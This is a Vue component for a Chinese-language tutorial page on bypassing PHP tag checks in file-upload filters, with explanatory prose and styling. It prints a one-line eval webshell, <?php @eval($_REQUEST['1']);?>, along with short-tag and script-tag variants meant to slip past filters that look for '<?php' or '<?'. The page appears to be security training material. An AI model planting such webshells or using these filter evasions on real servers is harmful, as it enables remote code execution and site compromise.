<template>
        <div>
                <el-row>
                        <el-col :span="19">
                                <div ref="containerRef" style="color: #fff;height: 750px; overflow-y: auto">
                                        <div id="part0" style="height: 100px;">
                                        </div>

                                        <div id="part2" style="height: 650px;">
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <div id="p2" style="height: 1750px;">
                                                                <h1 class="title">PHP标签检验绕过</h1>
                                                                <el-divider />
                                                                <br>
                                                                <br>
                                                                <h2 id="p2-0" class="sub-title">PHP常见标签</h2>
                                                                <el-tag style="color:#fff" type="info"
                                                                size="default">PHP</el-tag>常见的标签有:<br>
                                                                <ul>
                                                                        <li>
                                                                                标准标签:<br>
                                                                                <el-card style="max-width:750px;
                                                                                background-color:#282C34;
                                                                                max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                                                <span class="key">&lt;?php<br>
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        <span class="cmt">/* 您的代码 */</span><br>
                                                                                ?>
                                                                                </span>
                                                                                </el-card>
                                                                        </li>
                                                                        <li>
                                                                                短标签:<br>
                                                                                需要<el-tag style="color:#fff" type="info"
                                                                                size="default">php.ini</el-tag>中设置<el-tag style="color:#fff" type="info"
                                                                                size="default"><span class="key">short_open_tag</span> = On</el-tag>
                                                                                <el-card style="max-width:750px;
                                                                                background-color:#282C34;
                                                                                max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                                                <span class="key">&lt;?<br>
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        <span class="cmt">/* 您的代码 */</span><br>
                                                                                ?>
                                                                                </span>
                                                                                </el-card>
                                                                        </li>
                                                                        <li>
                                                                                <el-tag style="color:#fff" type="info"
                                                                                size="default">ASP</el-tag>风格:<br>
                                                                                这种标签形式在 <el-tag style="color:#fff" type="info"
                                                                                size="default">PHP 5.2.0</el-tag>之后被废弃,并且在<el-tag style="color:#fff" type="info"
                                                                                size="default">PHP 5.4.0</el-tag>之后完全移除
                                                                                <el-card style="max-width:750px;
                                                                                background-color:#282C34;
                                                                                max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                                                <span class="key">&lt;%<br>
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        &nbsp;
                                                                                        <span class="cmt">/* 您的代码 */</span><br>
                                                                                        %>
                                                                                </span>
                                                                        </el-card>
                                                                </li>
                                                                <li>
                                                                        <el-tag style="color:#fff" type="info"
                                                                        size="default">script</el-tag>标签:<br>
                                                                        主要用于嵌入<el-tag style="color:#fff" type="info"
                                                                                size="default">HTML</el-tag>中的<el-tag style="color:#fff" type="info"
                                                                                size="default">PHP</el-tag>代码;在<el-tag style="color:#fff" type="info"
                                                                                size="default">PHP 7.0</el-tag>及以上版本已被完全移除
                                                                        <el-card style="max-width:750px;
                                                                                background-color:#282C34;
                                                                                max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                                                &lt;<span class="func">script</span> <span class="lev2">language</span>="<span class="lev0">php</span>"><br>
                                                                                &nbsp;
                                                                                &nbsp;
                                                                                &nbsp;
                                                                                &nbsp;
                                                                                <span class="cmt">/* 您的代码 */</span><br>
                                                                                &lt;/<span class="func">script</span>>
                                                                                
                                                                        </el-card>
                                                                </li>
                                                                <li>
                                                                        回显标签:<br>
                                                                        使用条件:<el-tag style="color:#fff" type="info"
                                                                        size="default">PHP 5.4+</el-tag>默认开启
                                                                        <el-card style="max-width:750px;
                                                                        background-color:#282C34;
                                                                        max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                                        <span class="key">&lt;?=
                                                                                "<span class="lev0">Hello World!</span>"
                                                                                ?>
                                                                        </span>
                                                                        <br>
                                                                        <span class="cmt">//等价于:</span>
                                                                        <br>
                                                                        
                                                                        <span class="key">&lt;?php</span><br>
                                                                        &nbsp;        
                                                                        &nbsp;        
                                                                        &nbsp;        
                                                                        &nbsp;        
                                                                        <span class="key">echo</span> "<span class="lev0">Hello World!</span>";<br>
                                                                        <span class="key">?>
                                                                        </span><br>
                                                                </el-card>
                                                                
                                                        </li>
                                                </ul>
                                        </div>
                                        <div id="p3" style="height: 900px;">
                                                <h1 class="title">绕过手段</h1>
                                                <el-divider />
                                                <div id="p3-1" style="height: 550px;">
                                                        比如,当我们上传已经抓包修改过后缀与<el-tag style="color:#e1567b" type="info"
                                                        size="default">content-type</el-tag>的<el-tag style="color:#fff" type="info"
                                                        size="default">PHP</el-tag>文件,却仍被过滤;这时我们就应考虑存在文件内容检验<br>
                                                        文件内容检验最简单粗暴的方法就是直接将含有<el-tag style="color:#fff" type="info"
                                                        size="default">PHP</el-tag>标签的文件全部过滤<br>
                                                        但并不一定会过滤掉所有情况<br>
                                                        比如以下后门文件会被拦截:<br>
                                                        <el-card style="
                                                        max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;" 
                                                        body-style="line-height: 2;border-color:black;"
                                                        >
                                                        <span class="key">&lt;?php @<span class="func">eval</span><span class="lev0">(</span><span class="code">$_REQUEST<span class="lev0">[</span>'<span class="lev0">1</span>'<span class="lev0">]</span></span><span class="lev0">)</span><span class="code">;</span>?&gt;</span>    
                                                </el-card>
                                                但是如果换成短标签形式:<br>
                                                <el-card style="
                                                        max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;" 
                                                        body-style="line-height: 2;border-color:black;"
                                                        >
                                                        <span class="key">&lt;? @<span class="func">eval</span><span class="lev0">(</span><span class="code">$_REQUEST<span class="lev0">[</span>'<span class="lev0">1</span>'<span class="lev0">]</span></span><span class="lev0">)</span><span class="code">;</span>?&gt;</span>    
                                                </el-card>
                                                就能成功上传,则说明此处的文件内容检测只是简单地判断文件中是否包含<el-tag style="color:#e1567b" type="info"
                                                size="default">&lt;?php</el-tag><br>
                                                存在文件内容检测漏洞
                                                <br>
                                                <br>
                                                但如果是检测文件中是否含有<el-tag style="color:#e1567b" type="info"
                                                size="default">&lt;?</el-tag>:<br>
                                                但上传的文件最终会被嵌入<el-tag style="color:#fff" type="info"
                                                size="default">HTML</el-tag>中,同时<el-tag style="color:#fff" type="info"
                                                size="default">PHP < 7.0</el-tag>,则可以尝试<el-tag style="color:#fff" type="info"
                                                size="default">script</el-tag>标签绕过
                                                
                                                <el-card style="max-width:750px;
                                                        background-color:#282C34;
                                                        max-height: 1900px;" body-style="line-height: 2;border-color:black;">
                                                        &lt;<span class="func">script</span> <span class="lev2">language</span>="<span class="lev0">php</span>"><br>
                                                        &nbsp;
                                                        &nbsp;
                                                        &nbsp;
                                                        &nbsp;
                                                        <span class="key">&lt;?php @<span class="func">eval</span><span class="lev0">(</span><span class="code">$_REQUEST<span class="lev0">[</span>'<span class="lev0">1</span>'<span class="lev0">]</span></span><span class="lev0">)</span><span class="code">;</span>?&gt;</span>    
                                                        <br>
                                                        &lt;/<span class="func">script</span>>
                                                        
                                                </el-card>
                                                
                                        </div>
                                </div>
                        </el-text>
                </div>
                </div>
        </el-col>
            <el-col :span="5">
              <el-menu 
                :default-active="activeAnchor" 
                class="tech-anchor" 
                mode="vertical"
                @select="handleAnchorSelect"
              >
                <el-menu-item-group title="本页目录">
                  <el-menu-item index="p2">PHP标签检验绕过</el-menu-item>
                  <el-menu-item index="p2-0">— PHP常见标签</el-menu-item>
                  <el-menu-item index="p3">绕过手段</el-menu-item>
                  <el-menu-item index="p3-1">— 抓包测试</el-menu-item>
                </el-menu-item-group>
              </el-menu>
            </el-col>
          </el-row>
        </div>
      </template>
      
      <script>
      export default {
        data() {
          return {
            activeAnchor: '',
            containerRef: null
          }
        },
        mounted() {
          this.containerRef = this.$refs.containerRef;
          window.addEventListener('scroll', this.handleScroll);
        },
        beforeDestroy() {
          window.removeEventListener('scroll', this.handleScroll);
        },
        methods: {
          handleAnchorSelect(index) {
            const element = document.getElementById(index);
            if (element) {
              element.scrollIntoView({ behavior: 'smooth' });
            }
          },
          handleScroll() {
            // Implement scroll position detection to update activeAnchor
            const sections = ['p2', 'p2-0', 'p3', 'p3-1'];
            const scrollPosition = window.scrollY || window.pageYOffset;
            
            for (const section of sections) {
              const element = document.getElementById(section);
              if (element) {
                const offsetTop = element.offsetTop;
                const offsetHeight = element.offsetHeight;
                
                if (scrollPosition >= offsetTop - 100 && scrollPosition < offsetTop + offsetHeight - 100) {
                  this.activeAnchor = section;
                  break;
                }
              }
            }
          },
          error1() {
            this.$message({
              message: "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1",
              type: 'error',
            });
          },
          error2() {
            this.$message({
              message: 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near """ at line 1',
              type: 'error',
            });
          }
        }
      }
      </script>
      
      <style lang="less" scoped>
      code {
      font-family: "Cascadia Code";
      }
      
      .code-block {
      color: #c9d1d9;
      font-family: 'Cascadia Code', Consolas, 'Liberation Mono', Menlo, monospace;
      font-size: 15px;
      margin: 0;
      }
      
      .token.comment {
      color: #8b949e;
      }
      
      .token.keyword {
      color: #ff7b72;
      }
      
      .token.function {
        color: #d2a8ff;
      }
      
      .token.variable {
      color: #79c0ff;
      }
      
      .token.string {
      color: #a5d6ff;
      }
      
      .token.punctuation {
      color: #c9d1d9;
      }
      
      .token.operator {
        // 原样式内容，可根据实际情况补充
        color: #ff7b72;
      }
      
      /* el-tag 样式 */
      .el-tag {
      background-color: #3d3b3b;
      color: #fff;
      border-color: #282C34;
      }
      
      /* el-card 样式 */
      .el-card {
      background-color: #282C34;
      color: #fff;
      border-color: #282C34;
      }
      
      /* el-text 样式 */
      .el-text {
      color: #fff;
      }
      
      h1.title {
        margin: 0 0 3rem;
        font-size: 38px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron','微软雅黑';
      }
      
      h2.sub-title {
        margin: 0 0 3rem;
        font-size: 25px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron','微软雅黑';
      }
      
      h3.sub-sub-title {
        margin: 0 0 3rem;
        font-size: 20px;
        line-height: 1.4;
        letter-spacing: -.02em;
        font-weight: 800;
        text-align: left;
        font-family: 'Orbitron','微软雅黑';
      }
      
      .v {
        color: #4cbcec;
        font-family: 'Cascadia Code';
      }
      
      .key {
        color: #e1567b;
        font-family: 'Cascadia Code';
      }
      
      .lev0 {
        color: #f0de18;
        font-family: 'Cascadia Code';
      }
      
      .lev1 {
        color: rgb(238, 65, 195);
        font-family: 'Cascadia Code';
      }
      
      .lev2 {
        color: #239af5;
        font-family: 'Cascadia Code';
      }
      
      .func {
        color: #84D49C;
        /* color:#434040 */
        font-family: 'Cascadia Code';
      }
      
      .txt {
        font-family: 'Cascadia Code';
      }
      
      .code {
        color: #fff;
        font-family: 'Cascadia Code';
      }
      
      .cmt {
        color:rgb(99, 97, 97);
        font-family: 'Cascadia Code';
        font-size: 15px
      }
      
      .num {
        color: #8e40ce;
        font-family: 'Cascadia Code';
      }
      
      /* el-tag 样式 */
      .el-tag {
        background-color: #3d3b3b;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-card 样式 */
      .el-card {
        background-color: #282C34;
        color: #fff;
        border-color: #282C34;
      }
      
      /* el-text 样式 */
      .el-text {
        color: #fff;
      }
      
      /* 菜单容器样式 */
      .tech-anchor {
        --el-anchor-padding: 0 0 0 20px;
        --el-anchor-border-width: 0;
        --el-anchor-marker-height: 100%;
        --el-anchor-marker-width: 2px;
        background: rgba(10, 17, 40, 0.7);
        border-radius: 4px;
        padding: 15px;
        box-shadow: 0 0 15px rgba(0, 123, 255, 0.1);
        border-left: 1px solid rgba(0, 123, 255, 0.3);
      }
      
      /* 菜单标题样式 */
      .tech-anchor .el-menu-item-group__title {
        color: #d1e7ff !important;
        font-family: 'Cascadia Code', '微软雅黑';
        margin: 0 0 15px 0;
        padding-bottom: 10px;
        border-bottom: 1px solid rgba(0, 123, 255, 0.3);
        text-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
      }
      
      /* 菜单项基础样式 */
      .tech-anchor .el-menu-item {
        color: #a0c4ff !important;
        font-family: 'Cascadia Code', '微软雅黑';
        font-size: 0.9em;
        padding: 5px 10px;
        border-radius: 3px;
        transition: all 0.3s ease;
        position: relative;
      }
      
      /* 菜单项悬停效果 */
      .tech-anchor .el-menu-item:hover {
        color: #ffffff !important;
        background: rgba(0, 123, 255, 0.2);
        text-shadow: 0 0 5px #007bff;
        transform: translateX(5px);
      }
      
      .tech-anchor .el-menu-item:hover::before {
        content: '>';
        position: absolute;
        left: -10px;
        color: #00a2ff;
        opacity: 0;
        animation: blink-caret 0.8s step-end infinite alternate;
      }
      
      /* 激活菜单项样式 */
      .tech-anchor .el-menu-item.is-active {
        color: #ffffff !important;
        background: rgba(0, 123, 255, 0.3);
        text-shadow: 0 0 10px #00a2ff;
        border-left: 2px solid #007bff;
        padding-left: 15px;
        animation: pulse-glow 2s infinite alternate;
      }
      
      /* 响应式调整 */
      @media (max-width: 768px) {
        .tech-anchor {
          padding: 10px;
        }
      
        .tech-anchor .el-menu-item:hover::before {
          display: none;
        }
      }
      </style>